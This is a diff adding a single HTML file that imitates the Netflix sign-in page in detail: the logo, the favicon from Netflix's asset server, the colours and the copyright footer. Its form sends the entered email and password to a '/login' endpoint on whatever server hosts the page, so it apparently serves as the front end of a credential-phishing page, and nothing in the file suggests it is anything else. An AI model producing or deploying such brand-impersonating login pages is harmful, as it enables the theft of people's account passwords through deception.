@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix - Sign In</title>
+<link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Netflix Sans','Helvetica Neue',Helvetica,Arial,sans-serif;background:#000;min-height:100vh;position:relative}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(to top,rgba(0,0,0,0.9) 0,rgba(0,0,0,0.4) 50%,rgba(0,0,0,0.9) 100%),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1920 1080"><rect fill="%23141414" width="1920" height="1080"/></svg>') center/cover;z-index:0}
+.header{position:relative;z-index:1;padding:20px 40px}
+.header svg{width:167px;height:45px}
+.container{position:relative;z-index:1;max-width:450px;margin:0 auto;padding:60px 68px 40px;background:rgba(0,0,0,0.75);border-radius:4px;min-height:500px}
+h1{font-size:32px;font-weight:700;color:#fff;margin-bottom:28px}
+.input-group{position:relative;margin-bottom:16px}
+.input-group input{width:100%;padding:24px 16px 8px;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px;outline:none}
+.input-group input:focus{background:#454545}
+.input-group label{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#8c8c8c;font-size:16px;pointer-events:none;transition:all 0.2s}
+.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:14px;font-size:12px;color:#8c8c8c}
+.login-btn{width:100%;padding:16px;background:#e50914;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;margin-top:24px}
+.login-btn:hover{background:#f40612}
+.remember{display:flex;justify-content:space-between;align-items:center;margin-top:16px}
+.remember label{color:#b3b3b3;font-size:13px;display:flex;align-items:center;gap:4px;cursor:pointer}
+.remember a{color:#b3b3b3;font-size:13px;text-decoration:none}
+.remember a:hover{text-decoration:underline}
+.help{margin-top:80px;color:#737373;font-size:16px}
+.help a{color:#fff;text-decoration:none}
+.help a:hover{text-decoration:underline}
+.footer{position:relative;z-index:1;max-width:1000px;margin:40px auto;padding:20px 68px;color:#737373;font-size:13px}
+.footer a{color:#737373;text-decoration:none;margin-right:16px}
+@media(max-width:600px){.container{padding:40px 24px;margin:0 16px}.header{padding:16px 20px}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="header">
+    <svg viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">
+        <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.093-13.875L94.999 0H100.5l3.094 7.782L106.687 0h5.063l-6.688 14.28zM90.47 0l-4.033 27.968c-1.656-.157-3.312-.25-5-.344L85.5 0h4.97zM69.594 0v25.875c1.594-.094 3.156-.156 4.75-.156V4.312h5.594V0H69.594zM54.5 0v25.562c1.594 0 3.188.063 4.75.157V0H54.5zM44.25 10.687c-1.563 0-3.156.063-4.719.125v15.063c1.563.062 3.156.125 4.719.125 4.594 0 7.406-2.094 7.406-7.781 0-5.469-2.812-7.532-7.406-7.532zm.156-4.375c7.75 0 12.094 3.938 12.094 11.906 0 8.157-4.344 12.157-12.094 12.157-3.25 0-6.437-.156-9.656-.406V.438c3.219-.25 6.406-.438 9.656-.438zM25.562 0v26.437c-1.593-.093-3.187-.156-4.78-.156V4.312h-5.595V0h10.375zM10.156 0v26.125c-1.562-.031-3.156-.063-4.718-.063V4.312H0V0h10.156z" fill="#e50914"/>
+    </svg>
+</div>
+<div class="container">
+    <h1>Sign In</h1>
+    <form action="/login" method="POST">
+        <div class="input-group">
+            <input type="text" name="email" id="email" placeholder=" " required>
+            <label for="email">Email or mobile number</label>
+        </div>
+        <div class="input-group">
+            <input type="password" name="password" id="password" placeholder=" " required>
+            <label for="password">Password</label>
+        </div>
+        <button type="submit" class="login-btn">Sign In</button>
+    </form>
+    <div class="remember">
+        <label><input type="checkbox" checked> Remember me</label>
+        <a href="#">Need help?</a>
+    </div>
+    <p class="help">New to Netflix? <a href="#">Sign up now</a>.</p>
+</div>
+<div class="footer">
+    <a href="#">FAQ</a>
+    <a href="#">Help Centre</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy</a>
+    <a href="#">Cookie Preferences</a>
+    <br><br>© 1997-2024 Netflix, Inc.
+</div>
+</body>
+</html>
